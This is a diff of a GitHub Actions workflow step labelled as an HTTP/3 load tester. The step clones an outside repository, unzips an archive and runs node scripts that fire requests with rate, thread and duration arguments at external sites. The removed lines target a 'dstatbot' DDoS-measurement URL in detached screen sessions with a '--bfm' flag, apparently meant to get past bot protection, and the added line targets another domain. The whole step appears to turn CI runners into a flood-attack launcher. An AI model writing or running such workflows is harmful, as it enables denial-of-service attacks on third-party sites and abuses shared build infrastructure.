@@ -30,18 +30,13 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm install hpack chalk 
+          npm install hpack chalk  puppeteer-real-browser 
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
            
-          screen -dms ve  node y.js GET https://c2.dstatbot.win/yOAfc3iY 700 4 90 --bfm  --debug 
-
-          screen -dms ve node y.js GET https://c2.dstatbot.win/yOAfc3iY 700 4 90 --bfm  --debug 
-          node y.js GET https://c2.dstatbot.win/yOAfc3iY 700 4 90 --bfm  --debug
-
-
+          node m.js https://maplesecurity.xyz/ 200 3 3 3
           
 
           
